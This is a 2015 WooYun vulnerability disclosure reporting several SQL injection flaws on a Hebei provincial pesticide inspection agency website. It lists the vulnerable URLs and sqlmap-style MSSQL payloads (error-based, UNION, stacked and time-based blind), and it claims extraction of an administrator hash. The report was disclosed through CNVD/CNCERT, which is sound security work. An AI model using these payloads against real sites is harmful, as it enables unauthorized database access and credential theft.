wybug_title: 河北省农药检定所SQL注入集合(mssql)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-03-11：	细节已通知厂商并且等待厂商处理中									2015-03-16：	厂商已经确认，细节仅向厂商公开									2015-03-26：	细节向核心白帽子及相关领域专家公开									2015-04-05：	细节向普通白帽子公开									2015-04-15：	细节向实习白帽子公开									2015-04-25：	细节向公众公开  简要描述： 多个sql注入打包一起发了... 详细说明：  1.http://www.heica.gov.cn/search/gongqiu.php?KeyWord=1
Place: GETParameter: KeyWord    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: KeyWord=1%' AND 6722=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(121)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6722=6722) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(117)+CHAR(121)+CHAR(103)+CHAR(113))) AND '%'='    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: KeyWord=1%' UNION ALL SELECT CHAR(113)+CHAR(120)+CHAR(121)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(119)+CHAR(117)+CHAR(108)+CHAR(72)+CHAR(97)+CHAR(117)+CHAR(116)+CHAR(89)+CHAR(119)+CHAR(113)+CHAR(117)+CHAR(121)+CHAR(103)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: KeyWord=1%'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: KeyWord=1%' WAITFOR DELAY '0:0:5'--
2.http://www.heica.gov.cn/search/xinxi.php?KeyWord=1&type=新闻中心KeyWord也可以注入，payload同1
Place: GETParameter: type    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: KeyWord=1&type=新闻中心' AND 8452=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(106)+CHAR(121)+CHAR(113)+(SELECT (CASE WHEN (8452=8452) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(102)+CHAR(120)+CHAR(113))) AND 'aihC'='aihC    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: KeyWord=1&type=新闻中心' AND 5068=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'xctt'='xctt
3.http://www.heica.gov.cn/shengwuceding/more.php?type=2
Place: GETParameter: type    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: type=1' AND 4456=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(97)+CHAR(100)+CHAR(113)+(SELECT (CASE WHEN (4456=4456) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(119)+CHAR(114)+CHAR(113)+CHAR(113))) AND 'HGbN'='HGbN    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: type=1' AND 8682=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'waor'='waor
   漏洞证明：  可列库--

注出的administrator的hash--

   修复方案：  过滤   版权声明：转载请注明来源 ucifer@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-16 12:47 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
